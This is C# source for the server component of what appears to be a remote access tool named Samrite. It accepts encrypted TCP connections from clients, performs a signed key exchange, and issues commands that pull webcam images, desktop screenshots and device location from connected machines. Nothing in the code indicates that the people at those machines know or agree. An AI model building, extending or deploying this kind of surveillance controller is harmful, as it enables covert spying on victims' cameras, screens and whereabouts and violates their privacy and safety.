using NetworkCommsDotNet;
using NetworkCommsDotNet.Connections;
using SamriteShared;
using SamriteShared.Messages;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Xml.Serialization;

namespace SamriteServer.Core
{
    internal static class NetworkManager
    {
        private static List<Connection> connections = new List<Connection>();
        private static Dictionary<string, Connection> connectionDictionary = new Dictionary<string, Connection>();
        private static HashSet<string> pendingConnections = new HashSet<string>();
        private static RSAParameters rsaParams;
        private static Dictionary<string, byte[]> encryptionKeys = new Dictionary<string, byte[]>();

        internal static void Start()
        {
            connections.Clear();
            pendingConnections.Clear();
            connectionDictionary.Clear();
            encryptionKeys.Clear();

            StringReader stringReader = new StringReader(Properties.Resources.privkey);
            XmlSerializer serializer = new XmlSerializer(typeof(RSAParameters));
            rsaParams = (RSAParameters)serializer.Deserialize(stringReader);
            NetworkComms.AppendGlobalConnectionEstablishHandler((connection) =>
            {
                pendingConnections.Add(connection.ConnectionInfo.NetworkIdentifier.Value);
            });
            NetworkComms.AppendGlobalIncomingPacketHandler<byte[]>("Handshake", (header, connection, bytes) =>
            {
                byte[] publicBlob;
                using (MemoryStream readStream = new MemoryStream(bytes))
                {
                    using (BinaryReader reader = new BinaryReader(readStream))
                    {
                        ushort blobSize = reader.ReadUInt16();
                        publicBlob = reader.ReadBytes(blobSize);
                    }
                }
                if (pendingConnections.Contains(connection.ConnectionInfo.NetworkIdentifier.Value))
                {
                    pendingConnections.Remove(connection.ConnectionInfo.NetworkIdentifier.Value);
                    using (ECDiffieHellmanCng diffieHellman = new ECDiffieHellmanCng())
                    {
                        byte[] salt = new byte[8];
                        using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                        {
                            rng.GetBytes(salt);
                        }
                        using (Rfc2898DeriveBytes deriveBytes = new Rfc2898DeriveBytes(diffieHellman.DeriveKeyMaterial(CngKey.Import(publicBlob, CngKeyBlobFormat.EccPublicBlob)), salt, 1000))
                        {
                            encryptionKeys.Add(connection.ConnectionInfo.NetworkIdentifier.Value, deriveBytes.GetBytes(32));
                        }
                        using (RSACryptoServiceProvider csp = new RSACryptoServiceProvider())
                        {
                            try
                            {
                                csp.ImportParameters(rsaParams);
                                byte[] serverPublicPart = diffieHellman.PublicKey.ToByteArray();
                                byte[] signature = csp.SignData(serverPublicPart, new SHA512CryptoServiceProvider());
                                using (MemoryStream sendStream = new MemoryStream(salt.Length + serverPublicPart.Length + signature.Length + 6))
                                {
                                    using (BinaryWriter writer = new BinaryWriter(sendStream))
                                    {
                                        writer.Write((ushort)salt.Length);
                                        writer.Write(salt);
                                        writer.Write((ushort)serverPublicPart.Length);
                                        writer.Write(serverPublicPart);
                                        writer.Write((ushort)signature.Length);
                                        writer.Write(signature);
                                    }
                                    connection.SendObject("HandshakeResponse", sendStream.GetBuffer());
                                    connections.Add(connection);
                                    connectionDictionary.Add(connection.ConnectionInfo.NetworkIdentifier.Value, connection);
                                }
                            }
                            catch(Exception ex)
                            {
                                Console.WriteLine(ex.ToString());
                            }
                            finally
                            {
                                csp.PersistKeyInCsp = false;
                            }
                        }
                    }
                }
                else
                {
                    //Something wrong. Disconnect them.
                    connection.CloseConnection(true);
                }
            });
            NetworkComms.AppendGlobalConnectionCloseHandler((connection) =>
            {
                if(connectionDictionary.ContainsKey(connection.ConnectionInfo.NetworkIdentifier.Value))
                {
                    connectionDictionary.Remove(connection.ConnectionInfo.NetworkIdentifier.Value);
                    connections.RemoveAll(x => x.ConnectionInfo.NetworkIdentifier.Value == connection.ConnectionInfo.NetworkIdentifier.Value);
                    encryptionKeys.Remove(connection.ConnectionInfo.NetworkIdentifier.Value);
                }
            });
            Connection.StartListening(ConnectionType.TCP, new IPEndPoint(IPAddress.Any, Config.LISTEN_PORT));
        }

        internal static void GetWebcamDevices(Connection connection, Action<VideoDevices> callback)
        {
            connection.AppendIncomingPacketHandler<byte[]>("CameraDevices", (header, conn, data) =>
            {
                connection.RemoveIncomingPacketHandler("CameraDevices");
                callback(Serializer.Deserialize<VideoDevices>(data, encryptionKeys[connection.ConnectionInfo.NetworkIdentifier]));
            });
            connection.SendObject<byte>("GetCameraDevices", 0);
        }

        internal static void GetWebcamPNG(Connection connection, int deviceIndex, int height, int width, Action<byte[]> callback)
        {
            connection.AppendIncomingPacketHandler<byte[]>("CameraImage", (header, conn, data) =>
            {
                connection.RemoveIncomingPacketHandler("CameraImage");
                callback(Serializer.Deserialize<ByteData>(data, encryptionKeys[connection.ConnectionInfo.NetworkIdentifier.Value]).data);
            });
            GetImage request = new GetImage()
            {
                deviceIndex = deviceIndex,
                height = height,
                width = width
            };
            connection.SendObject<byte[]>("GetCameraImage", Serializer.Serialize(request, encryptionKeys[connection.ConnectionInfo.NetworkIdentifier]));
        }

        internal static void GetDesktopPNG(Connection connection, Action<byte[]> callback)
        {
            connection.AppendIncomingPacketHandler<byte[]>("DesktopImage", (header, conn, data) =>
            {
                connection.RemoveIncomingPacketHandler("DesktopImage");
                callback(Serializer.Deserialize<ByteData>(data, encryptionKeys[connection.ConnectionInfo.NetworkIdentifier.Value]).data);
            });
            connection.SendObject<byte>("GetDesktopImage", 0);
        }

        internal static void GetLocation(Connection connection, Action<DeviceLocation> callback)
        {
            connection.AppendIncomingPacketHandler<byte[]>("Location", (header, conn, data) =>
            {
                connection.RemoveIncomingPacketHandler("Location");
                callback(Serializer.Deserialize<DeviceLocation>(data, encryptionKeys[connection.ConnectionInfo.NetworkIdentifier.Value]));
            });
            connection.SendObject<byte>("GetLocation", 0);
        }
    }
}
